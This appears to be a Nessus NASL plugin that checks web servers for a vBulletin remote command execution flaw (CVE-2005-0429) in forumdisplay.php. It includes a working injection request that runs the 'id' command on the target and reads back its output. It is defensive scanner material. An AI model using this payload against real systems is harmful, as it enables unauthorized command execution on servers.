#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: AL3NDALEEB <al3ndaleeb at uk2 dot net>
# This script is released under the GNU GPL v2
#

 desc = "
Synopsis :

The remote web server contains a PHP script that allows execution of
arbitrary PHP code. 

Description :

The remote version of vBulletin is vulnerable to a remote command
execution flaw through the script 'forumdisplay.php'.  A malicious
user could exploit this flaw to execute arbitrary commands on the
remote host with the privileges of the web server. 

http://archives.neohapsis.com/archives/bugtraq/2005-02/0155.html

Solution: 

Upgrade to vBulletin 3.0.4 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";


if(description)
{
 script_id(16455);
 script_cve_id("CVE-2005-0429");
 script_bugtraq_id(12542);
 script_version("$Revision: 1.6 $");
 name["english"] = "vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability";
 script_name(english:name["english"]);

 script_description(english:desc);
 
 summary["english"] = "Checks for vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("vbulletin_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

# the code

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  http_check_remote_code (
			unique_dir:dir,
			check_request: '/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(\'id\')."',
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc
			);
}
